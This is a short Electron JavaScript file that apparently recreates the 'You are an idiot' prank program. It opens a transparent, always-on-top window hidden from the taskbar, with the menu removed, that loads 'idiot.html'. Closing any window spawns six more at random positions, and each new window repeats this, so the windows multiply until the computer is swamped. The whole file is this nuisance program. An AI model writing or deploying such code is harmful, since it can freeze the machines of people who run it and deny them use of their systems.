const { app, BrowserWindow, Menu } = require('electron');


app.on('ready', () => {
    createStartWindow();
    
});

async function createStartWindow() {
    const win = new BrowserWindow({
        width: 640,
        height: 480,
        webPreferences: {
            nodeIntegration: true
        },
        show: true,
        transparent: true,
        resizable: false,
        alwaysOnTop: true,
        skipTaskbar: true
    });

    win.loadFile('idiot.html');
    win.setIcon('logo.png');

    Menu.setApplicationMenu(null);

    win.on('closed', () => {
        for(let i = 0; i < 6; i++) {
            createNewWindow();
        }
    });
}

async function createNewWindow() {
    const win = new BrowserWindow({
        width: 320,
        height: 240,
        webPreferences: {
            nodeIntegration: true
        },
        show: true,
        transparent: true,
        resizable: false,
        alwaysOnTop: true,
        skipTaskbar: true
    });

    win.loadFile('idiot.html');
    win.setIcon('logo.png');

    win.on('closed', () => {
        for (let i = 0; i < 6; i++) {
            createNewWindow();
        }
    });

    // put the window in a random position
    win.setPosition(Math.floor(Math.random() * 1500), Math.floor(Math.random() * 1000));
}